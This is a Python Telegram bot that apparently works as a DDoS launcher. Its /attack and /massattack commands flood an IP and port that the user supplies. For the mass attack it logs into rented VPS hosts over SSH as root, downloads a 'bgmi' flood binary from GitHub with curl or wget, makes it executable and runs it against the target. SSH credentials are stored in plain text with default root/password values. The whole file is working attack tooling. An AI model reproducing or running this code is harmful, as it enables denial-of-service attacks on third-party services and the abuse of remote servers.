import os
import asyncio
import subprocess
import paramiko
import socket
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ---------------- Configuration ----------------
try:
    import config
    AUTHORIZED_USERS = [str(config.USER_ID)]
except:
    AUTHORIZED_USERS = ["6437994839"]

MAX_THREADS = "999"
MAX_PPS = "-10"
SSH_USERNAME = "root"
SSH_PASSWORD = "password"

# VPS storage
vps_list = {}
ssh_credentials = {}

# ---------------- VPS Management Functions ----------------
def load_vps():
    global vps_list, ssh_credentials
    try:
        if os.path.exists('vps_list.txt'):
            with open('vps_list.txt', 'r') as f:
                for line in f:
                    if ':' in line:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            name = parts[0]
                            ip = parts[1]
                            username = parts[2] if len(parts) > 2 else SSH_USERNAME
                            password = parts[3] if len(parts) > 3 else SSH_PASSWORD
                            
                            vps_list[name] = ip
                            ssh_credentials[name] = {'username': username, 'password': password}
    except Exception as e:
        print(f"Error loading VPS list: {e}")

def save_vps():
    try:
        with open('vps_list.txt', 'w') as f:
            for name, ip in vps_list.items():
                creds = ssh_credentials.get(name, {'username': SSH_USERNAME, 'password': SSH_PASSWORD})
                f.write(f"{name}:{ip}:{creds['username']}:{creds['password']}\n")
    except Exception as e:
        print(f"Error saving VPS list: {e}")

def check_vps_status(ip):
    try:
        # First try to resolve the hostname
        socket.gethostbyname(ip)
        
        # Then try ping
        result = subprocess.run(
            ['ping', '-c', '1', '-W', '3', ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return result.returncode == 0
    except socket.gaierror:
        return False
    except:
        return False

def execute_ssh_command(ip, username, password, command):
    try:
        # First verify the IP/hostname is resolvable
        try:
            socket.gethostbyname(ip)
        except socket.gaierror:
            return False, "", f"Cannot resolve hostname: {ip}"
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Set timeout to 10 seconds
        client.connect(ip, username=username, password=password, timeout=10, banner_timeout=10)
        
        stdin, stdout, stderr = client.exec_command(command, timeout=15)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        
        client.close()
        return True, output, error
    except paramiko.AuthenticationException:
        return False, "", "Authentication failed (wrong username/password)"
    except paramiko.SSHException as e:
        return False, "", f"SSH connection error: {str(e)}"
    except socket.timeout:
        return False, "", "Connection timeout"
    except socket.error as e:
        return False, "", f"Socket error: {str(e)}"
    except Exception as e:
        return False, "", f"Unexpected error: {str(e)}"

async def send_attack_to_vps(vps_name, ip, credentials, target_ip, target_port, duration):
    try:
        # First check if VPS is reachable
        if not check_vps_status(ip):
            return f"❌ {vps_name} ({ip}): OFFLINE (cannot ping)"
        
        # Try to download and setup bgmi
        setup_cmd = "which curl >/dev/null 2>&1 && curl -s -o /tmp/bgmi https://github.com/Ritikxy209/at/raw/main/bgmi || wget -q -O /tmp/bgmi https://github.com/Ritikxy209/at/raw/main/bgmi; chmod +x /tmp/bgmi 2>/dev/null"
        success, output, error = execute_ssh_command(ip, credentials['username'], credentials['password'], setup_cmd)
        
        if not success:
            return f"❌ {vps_name} ({ip}): Setup Failed - {error}"
        
        # Execute attack command
        attack_cmd = f"timeout {duration} /tmp/bgmi {target_ip} {target_port} {duration} {MAX_THREADS} {MAX_PPS} >/dev/null 2>&1 &"
        success, output, error = execute_ssh_command(ip, credentials['username'], credentials['password'], attack_cmd)
        
        if success:
            return f"✅ {vps_name} ({ip}): Attack launched successfully"
        else:
            return f"❌ {vps_name} ({ip}): Attack failed - {error}"
    except Exception as e:
        return f"❌ {vps_name} ({ip}): Error - {str(e)}"

# ---------------- Commands ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to start attacks.\n"
        "Use /vps add <name> <ip> <user> <pass> to add a VPS\n"
        "Use /vps list to see all VPS\n"
        "Use /vps check to check VPS status\n"
        "Use /massattack <IP> <PORT> <DURATION> to attack from all VPS"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
        return

    ip, port, duration = args

    try:
        bgmi_path = os.path.join(os.getcwd(), "bgmi")
        if not os.path.exists(bgmi_path):
            await update.message.reply_text("❌ bgmi binary not found.")
            return

        os.chmod(bgmi_path, 0o755)
        
        # Truncate long messages to avoid "Text is too long" error
        if len(f"⚡ Attack started on {ip}:{port} for {duration}s.") > 4000:
            await update.message.reply_text("⚡ Attack started...")
        else:
            await update.message.reply_text(f"⚡ Attack started on {ip}:{port} for {duration}s.")

        process = await asyncio.create_subprocess_exec(
            bgmi_path, ip, port, duration, MAX_THREADS, MAX_PPS,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        
        # Truncate long output to avoid Telegram message limits
        debug_msg = ""
        if stdout:
            stdout_str = stdout.decode()
            debug_msg += f"stdout:\n{stdout_str[:500]}{'...' if len(stdout_str) > 500 else ''}\n"
        if stderr:
            stderr_str = stderr.decode()
            debug_msg += f"stderr:\n{stderr_str[:500]}{'...' if len(stderr_str) > 500 else ''}\n"

        result_msg = f"✅ Attack on {ip}:{port} for {duration}s completed."
        if debug_msg:
            result_msg += f"\n\n{debug_msg}"
            
        # Split long messages
        if len(result_msg) > 4000:
            await update.message.reply_text(result_msg[:4000])
            if len(result_msg) > 4000:
                await update.message.reply_text(result_msg[4000:])
        else:
            await update.message.reply_text(result_msg)
            
    except Exception as e:
        error_msg = f"❌ Failed: {str(e)}"
        if len(error_msg) > 4000:
            error_msg = error_msg[:4000]
        await update.message.reply_text(error_msg)

async def mass_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /massattack <IP> <PORT> <DURATION>")
        return

    target_ip, target_port, duration = args

    if not vps_list:
        await update.message.reply_text("❌ No VPS added. Use /vps add first.")
        return

    message = await update.message.reply_text(
        f"🌐 Starting MASS ATTACK on {target_ip}:{target_port} for {duration}s...\n"
        f"Attacking from {len(vps_list)} VPS..."
    )

    tasks = []
    for name, ip in vps_list.items():
        credentials = ssh_credentials.get(name, {'username': SSH_USERNAME, 'password': SSH_PASSWORD})
        task = send_attack_to_vps(name, ip, credentials, target_ip, target_port, duration)
        tasks.append(task)

    results = await asyncio.gather(*tasks)
    
    # Format results to avoid long messages
    result_text = f"🎯 Mass Attack Results on {target_ip}:{target_port}\n\n"
    online_count = 0
    offline_count = 0

    for result in results:
        if "✅" in result:
            online_count += 1
        else:
            offline_count += 1
        result_text += f"{result}\n"

    result_text += f"\n📊 Summary: {online_count} successful, {offline_count} failed"
    
    # Split long messages
    if len(result_text) > 4000:
        parts = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
        for part in parts:
            await update.message.reply_text(part)
    else:
        await message.edit_text(result_text)

async def vps_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test SSH connection to a VPS"""
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized.")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /vpstest <vps_name>")
        return

    vps_name = args[0]
    if vps_name not in vps_list:
        await update.message.reply_text(f"❌ VPS '{vps_name}' not found.")
        return

    ip = vps_list[vps_name]
    credentials = ssh_credentials.get(vps_name, {'username': SSH_USERNAME, 'password': SSH_PASSWORD})
    
    await update.message.reply_text(f"🔍 Testing connection to {vps_name} ({ip})...")
    
    # Test ping first
    ping_status = check_vps_status(ip)
    if not ping_status:
        await update.message.reply_text(f"❌ {vps_name}: Cannot ping - VPS may be offline or IP invalid")
        return
    
    # Test SSH connection
    success, output, error = execute_ssh_command(ip, credentials['username'], credentials['password'], "echo 'SSH test successful'")
    
    if success:
        await update.message.reply_text(f"✅ {vps_name}: SSH connection successful!")
    else:
        await update.message.reply_text(f"❌ {vps_name}: SSH connection failed: {error}")

async def vps_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "VPS Management Commands:\n"
            "/vps add <name> <ip> <user> <pass>\n"
            "/vps remove <name>\n"
            "/vps list\n"
            "/vps check\n"
            "/vps check <name>\n"
            "/vpstest <name> - Test SSH connection\n"
            "/massattack <IP> <PORT> <DURATION>"
        )
        return

    command = args[0].lower()
    
    if command == "add":
        if len(args) < 3:
            await update.message.reply_text("Usage: /vps add <name> <ip> <user> <pass>")
            return
            
        name = args[1]
        ip = args[2]
        
        # Validate IP/hostname
        try:
            socket.gethostbyname(ip)
        except socket.gaierror:
            await update.message.reply_text(f"❌ Invalid IP/hostname: {ip}")
            return
            
        username = args[3] if len(args) > 3 else SSH_USERNAME
        password = args[4] if len(args) > 4 else SSH_PASSWORD
        
        vps_list[name] = ip
        ssh_credentials[name] = {'username': username, 'password': password}
        save_vps()
        await update.message.reply_text(f"✅ VPS '{name}' added with IP {ip}.")
    
    elif command == "remove" and len(args) >= 2:
        name = args[1]
        if name in vps_list:
            del vps_list[name]
            if name in ssh_credentials:
                del ssh_credentials[name]
            save_vps()
            await update.message.reply_text(f"✅ VPS '{name}' removed.")
        else:
            await update.message.reply_text(f"❌ VPS '{name}' not found.")
    
    elif command == "list":
        if not vps_list:
            await update.message.reply_text("No VPS added yet.")
        else:
            vps_text = "📋 VPS List:\n"
            for name, ip in vps_list.items():
                creds = ssh_credentials.get(name, {'username': SSH_USERNAME, 'password': '***'})
                vps_text += f"• {name}: {ip} (User: {creds['username']})\n"
            await update.message.reply_text(vps_text)
    
    elif command == "check":
        if len(args) == 1:
            if not vps_list:
                await update.message.reply_text("No VPS added yet.")
                return
                
            status_text = "🔍 VPS Status Check:\n"
            online_count = 0
            
            for name, ip in vps_list.items():
                status = check_vps_status(ip)
                if status:
                    online_count += 1
                status_text += f"• {name} ({ip}): {'🟢 ONLINE' if status else '🔴 OFFLINE'}\n"
            
            status_text += f"\n📊 Online: {online_count}/{len(vps_list)} VPS"
            await update.message.reply_text(status_text)
        
        elif len(args) >= 2:
            name = args[1]
            if name in vps_list:
                ip = vps_list[name]
                status = check_vps_status(ip)
                await update.message.reply_text(
                    f"🔍 VPS '{name}' ({ip}): {'🟢 ONLINE' if status else '🔴 OFFLINE'}"
                )
            else:
                await update.message.reply_text(f"❌ VPS '{name}' not found.")
    
    else:
        await update.message.reply_text("Invalid VPS command.")

# ---------------- Main Bot ----------------
if __name__ == "__main__":
    # Install paramiko if not available
    try:
        import paramiko
    except ImportError:
        print("Installing paramiko...")
        subprocess.run(["pip3", "install", "paramiko"])
        import paramiko
    
    load_vps()
    
    try:
        app = ApplicationBuilder().token(config.BOT_TOKEN).build()
    except:
        print("Error: Please set up config.py with BOT_TOKEN and USER_ID")
        exit(1)
        
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("massattack", mass_attack))
    app.add_handler(CommandHandler("vps", vps_management))
    app.add_handler(CommandHandler("vpstest", vps_test))

    print("Spike bot with improved error handling is running...")
    app.run_polling()
